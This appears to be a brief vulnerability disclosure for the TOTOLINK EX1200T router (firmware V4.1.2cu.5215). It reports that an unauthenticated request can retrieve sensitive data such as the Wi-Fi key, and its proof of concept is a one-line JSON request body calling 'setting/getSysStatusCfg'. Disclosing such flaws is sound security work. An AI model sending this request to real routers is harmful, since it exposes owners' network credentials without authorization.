# TOTOLINK EX1200T LEAK

## Vulnerability Description

PRODUCT: TOTOLINK EX1200T V4.1.2cu.5215 (latest version)

The attacker can get the sensitive information (wifikey, etc.) without authorization.

## PoC

![image-20211021152720178](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211021152720178.png)

```
{"topicurl":"setting/getSysStatusCfg"}
```

